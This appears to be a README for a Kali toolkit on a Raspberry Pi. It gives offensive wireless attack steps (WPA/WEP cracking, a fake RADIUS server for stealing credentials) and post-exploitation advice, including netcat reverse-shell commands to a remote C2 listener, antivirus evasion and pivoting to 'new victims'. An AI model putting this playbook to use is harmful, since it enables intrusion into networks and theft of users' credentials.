These are all of the binaries needed from the official PC REPO of KALI LINUX.

Some of them MAY NOT WORK with the intended platform, the Raspberry Pi 3.

Be forewarned! Only Python packages may work due to the architecture difference, others may just stop working or crash.

But I added them here because I felt that the Raspian repos are too limited.

# KATOOLIN, THE RASPIAN REPO, VERSUS KALI REPO, AND LIMITATIONS OF RPIs (architecture)

Furthermore you need a full installation of Katoolin, with the APT sources hook OFF! Only turn it on to install a new tool. Then TURN IT BACK OFF.

As far as I remembered, the WifiPhisher module will not work WITHOUT changing your wlan interfaces back to wlan0, wlan1, etc.

To do this, edit a oneliner on the /boot/cmdline.txt file in your Raspberry pi like outlined in my copy of the configuration.

# RECOMMENDATIONS

Versus...

WPA2-PSK (most common). Wardrive with besside-ng, crack with aircrack/hashcat. I recommend not even driving, vehicles travel too fast for the antenna to pick up the handshake in time. If you do drive, post yourself for about 2 minutes before inching forwards one city block or 3x households. 

WPA2-MGT (hardest). Use hostapd-wpe and freeradius-wpe to generate a fake RADIUS server. Deauthenticate the REAL server and trick someone to connect to you and hand over their NTLM keys (userpass). THen crack it with asleap.
Be aware this only works if there are no SERVER certificates installed. The server certificates are verified by the CLIENT before the creds are transmitted. If they know your certificate is forged or nonexistent, you get nothing

WEP (easiest). Be sure you are able to stay around the area for at least thirty minutess. You need to capture over 8000 IV frames.

# POST EXPLOITATION

1. Make your reverse shell payloads AHEAD OF TIME. By at leeast a day in advance! Not during the engagement!
2. Test that payload with a REMOTE C2 listener. Like Amazon EC2 AWS. Which is FREE if you are a university student for 1x year
3. VPS's are recommended because the ports are much more predictable and easier to configure. If your household firewall closed up it's vital listening port, you miss the shell, period.
4. Practice using netcat to restore lost connections. "nc -nv <listener public ip> <listener port>". 
	On listener, keep "nc -nvlp <listening port> on" AT ALL TIMES, either by manually or leaving a cronjob script to do it for you
5. Pre-plan and pre-load your payloads and toolkits using previous reconnaissance information.
6. It is NOT REQUIRED to buy a Wi-Fi pineapple. The free mana toolkit here does the same exact thing. With Wifi-Phisher you can do even better stuff. The only thing you lack is the integrated quad-antenna amplifiers, which could be obtained cheaper and better anyways (look up Simple Wifi Parabolic Dish $40 + $80 UBNT M2 Bullet Amplifier Injector)
7. Get more practice with passing shells, and restoring lost ones (or killed by the AV).  You will lose shells, a lot! It happens.

At least... learn how to...
	Open a reverse connection with netcat, upgrade it to Meterpreter or Pupy
	Upgrade a SSH remote login into a System-Session.
	Do the same with a open Telnet port
	Learn how you can use MSF to execute even better shells such as Pupy.
	Pivot with the port-forward module in meterpreter to find new victims.
	Learn how to bring "partially" some of your tools with you! Using proxytunnels. 
	Build your first SSH tunnel with your first hacked victim. Use that victim's router and machines to attack the unprotected machines behind the NAT.
	Learn how to quickly search toolkits in Metasploit. "type:" is "Auxiliary, Post Exploitation, Exploits, Servers. For example


# KEYBOARD USERS

If you plan on using a full-sized keyboard with your RPI be aware that most desktop keyboards will draw TOO MUCH POWER, your external network cards will stutter and fail intermittently, response may become completely dead on the keyboard. To improve yo9ur chances, please turn off your XServer display which is found in the RPI settings.


